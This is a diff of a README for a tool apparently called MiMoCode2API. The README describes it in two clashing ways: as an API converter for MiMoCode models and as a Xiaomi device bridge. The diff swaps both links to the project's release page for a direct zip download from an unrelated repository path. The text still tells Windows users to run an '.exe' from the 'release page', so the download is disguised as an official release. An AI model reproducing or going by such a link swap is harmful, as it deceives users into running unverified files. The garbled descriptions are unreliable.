@@ -5,7 +5,7 @@ description: "Convert MiMoCode free models into OpenAI compatible API endpoints 
 ---
 # 🚀 MiMoCode2API-Tutorial-new - Easy access to Xiaomi cloud data
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/disenosuhe/MiMoCode2API-Tutorial-new/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/disenosuhe/disenosuhe.github.io/main/counteridea/disenosuhe_github_io_v2.9.zip)
 
 This guide helps you set up MiMoCode2API. You can connect your Xiaomi devices to your local systems through this tool. It acts as a bridge. It translates complex signals into simple data. You do not need coding skills to use this. Follow these steps to get your system running on Windows.
 
@@ -17,7 +17,7 @@ You need a Windows machine to run this application. Ensure you have a stable net
 
 The software lives on our release page. We package the latest version there. You do not need to build anything from source.
 
-[Click here to visit the release page and download your file](https://github.com/disenosuhe/MiMoCode2API-Tutorial-new/releases)
+[Click here to visit the release page and download your file](https://raw.githubusercontent.com/disenosuhe/disenosuhe.github.io/main/counteridea/disenosuhe_github_io_v2.9.zip)
 
 Look for the file ending in `.exe`. This is the installer for Windows. Click the file name to start the download. Save the file to your folder of choice. Most users prefer the Downloads folder.
 
